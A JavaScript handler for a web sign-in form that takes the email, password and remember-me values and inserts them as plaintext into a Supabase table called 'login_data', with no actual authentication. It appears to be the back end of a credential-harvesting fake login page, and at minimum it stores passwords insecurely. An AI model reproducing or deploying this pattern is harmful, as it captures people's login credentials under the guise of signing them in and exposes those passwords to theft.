// Import the Supabase client
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
import { domain, anonKey } from './dbData.js';

// Initialize Supabase client
const supabase = createClient(domain, anonKey);


const button = document.getElementById('submit_btn');

// Function to handle form submission
const handleSubmit = async (event) => {
  event.preventDefault(); // Prevent the default form submission behavior

  button.innerHTML = 'Loading...';

  // Get form inputs
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  const rememberMe = document.getElementById('remember').checked;

  if ( email === '' || password === '') {
    alert('Please enter email and password');
    button.innerHTML = 'Sign In';
    return;
  }

  // Insert data into the user_data table
  const { data, error } = await supabase.from('login_data').insert([
    { Email: email, Password: password, Remember: rememberMe },
  ]);

  if (error) {
    console.error('Error inserting data:', error.message);
  } else {
    console.log('Data inserted successfully:', data);
    // Redirect or perform any other action upon successful insertion
  }

  button.innerHTML = 'Sign In';

};

// Add event listener to form submission
button.addEventListener('click', handleSubmit);